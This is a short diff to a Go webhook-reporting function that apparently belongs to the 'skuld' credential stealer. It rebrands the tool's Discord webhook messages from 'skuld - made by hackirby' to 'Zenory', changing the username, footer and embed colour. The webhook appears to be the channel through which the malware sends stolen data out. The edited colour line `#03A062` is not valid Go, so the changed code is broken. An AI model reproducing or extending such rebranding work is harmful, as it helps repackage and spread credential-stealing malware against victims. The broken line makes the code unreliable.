@@ -171,16 +171,16 @@ func Webhook(webhook string, data map[string]interface{}, files ...string) {
 		return
 	}
 
-	data["username"] = "skuld"
+	data["username"] = "Zenory"
 	data["avatar_url"] = "https://i.ibb.co/GFZ2tHJ/shakabaiano-1674282487.jpg"
 
 	if data["embeds"] != nil {
 		for _, embed := range data["embeds"].([]map[string]interface{}) {
 			embed["footer"] = map[string]interface{}{
-				"text":     "skuld - made by hackirby",
+				"text":     "skuld - made by Zenory Team",
 				"icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
 			}
-			embed["color"] = 0xb143e3
+			embed["color"] = #03A062
 		}
 	}
 
